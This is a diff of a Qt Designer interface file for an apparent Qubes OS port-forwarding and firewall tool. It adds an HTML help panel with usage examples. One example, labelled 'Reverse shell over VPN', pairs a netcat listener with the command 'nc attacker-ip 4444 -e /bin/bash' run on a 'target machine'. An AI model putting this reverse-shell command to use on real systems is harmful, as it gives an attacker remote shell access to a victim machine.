@@ -78,7 +78,7 @@
            </attribute>
            <column>
             <property name="text">
-             <string> </string>
+             <string/>
             </property>
            </column>
            <column>
@@ -169,7 +169,7 @@
            </attribute>
            <column>
             <property name="text">
-             <string> </string>
+             <string/>
             </property>
            </column>
            <column>
@@ -255,7 +255,30 @@ p, li { white-space: pre-wrap; }
       </attribute>
       <layout class="QGridLayout" name="gridLayout_5">
        <item row="0" column="0">
-        <layout class="QVBoxLayout" name="verticalLayout_4"/>
+        <layout class="QVBoxLayout" name="verticalLayout_4">
+         <item>
+          <widget class="QTextBrowser" name="textBrowser_2">
+           <property name="html">
+            <string>&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0//EN&quot; &quot;http://www.w3.org/TR/REC-html40/strict.dtd&quot;&gt;
+&lt;html&gt;&lt;head&gt;&lt;meta name=&quot;qrichtext&quot; content=&quot;1&quot; /&gt;&lt;style type=&quot;text/css&quot;&gt;
+p, li { white-space: pre-wrap; }
+&lt;/style&gt;&lt;/head&gt;&lt;body style=&quot; font-family:'Sans'; font-size:10pt; font-weight:400; font-style:normal;&quot;&gt;
+&lt;h3 style=&quot; margin-top:14px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;&quot;&gt;&lt;span style=&quot; font-size:large; font-weight:600;&quot;&gt;Tabs&lt;/span&gt;&lt;/h3&gt;
+&lt;h4 style=&quot; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;&quot;&gt;&lt;span style=&quot; font-size:medium; font-weight:600;&quot;&gt;Port Forwarding&lt;/span&gt;&lt;/h4&gt;
+&lt;p style=&quot; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;&quot;&gt;You can easy forwarding any TCP port between 2 qubes&lt;/p&gt;
+&lt;h4 style=&quot; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;&quot;&gt;&lt;span style=&quot; font-size:medium; font-weight:600;&quot;&gt;Firewall&lt;/span&gt;&lt;/h4&gt;
+&lt;p style=&quot; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;&quot;&gt;By default Qubes OS deny any connections outside the world, for example, if you'll try to open &lt;span style=&quot; font-family:'monospace';&quot;&gt;0.0.0.0:8000&lt;/span&gt; in &lt;span style=&quot; font-family:'monospace';&quot;&gt;sys-net&lt;/span&gt;, you still haven't access. Here you can fix that limitation. &lt;/p&gt;
+&lt;h4 style=&quot; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;&quot;&gt;&lt;span style=&quot; font-size:medium; font-weight:600;&quot;&gt;About&lt;/span&gt;&lt;/h4&gt;
+&lt;p style=&quot; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;&quot;&gt;Donation tab &lt;/p&gt;
+&lt;h3 style=&quot; margin-top:14px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;&quot;&gt;&lt;span style=&quot; font-size:large; font-weight:600;&quot;&gt;Some exmples&lt;/span&gt;&lt;/h3&gt;
+&lt;h4 style=&quot; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;&quot;&gt;&lt;span style=&quot; font-size:medium; font-weight:600;&quot;&gt;Start web server on personal:8000 and access for it using moble in the same wifi network&lt;/span&gt;&lt;/h4&gt;
+&lt;p style=&quot; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;&quot;&gt;Run &lt;span style=&quot; font-family:'monospace';&quot;&gt;python -m http.server 8000&lt;/span&gt; in &lt;span style=&quot; font-family:'monospace';&quot;&gt;personal&lt;/span&gt; qube. Add port forward rule: &lt;span style=&quot; font-family:'monospace';&quot;&gt;personal:8000 =&amp;gt; sys-net:1337&lt;/span&gt; after that open port in firewall tab &lt;span style=&quot; font-family:'monospace';&quot;&gt;sys-net:1337&lt;/span&gt;. On the mobile device in browser open &lt;span style=&quot; font-family:'monospace';&quot;&gt;http://your-laptop-ip:1337&lt;/span&gt;&lt;/p&gt;
+&lt;h4 style=&quot; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;&quot;&gt;&lt;span style=&quot; font-size:medium; font-weight:600;&quot;&gt;Reverse shell over VPN&lt;/span&gt;&lt;/h4&gt;
+&lt;p style=&quot; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;&quot;&gt;Run &lt;span style=&quot; font-family:'monospace';&quot;&gt;sudo nc -lvp 4444&lt;/span&gt; in &lt;span style=&quot; font-family:'monospace';&quot;&gt;personal&lt;/span&gt; qube. Add firewall rule &lt;span style=&quot; font-family:'monospace';&quot;&gt;personal:4444&lt;/span&gt;. Access to your shell from target machine &lt;span style=&quot; font-family:'monospace';&quot;&gt;nc attacker-ip 4444 -e /bin/bash&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</string>
+           </property>
+          </widget>
+         </item>
+        </layout>
        </item>
       </layout>
      </widget>
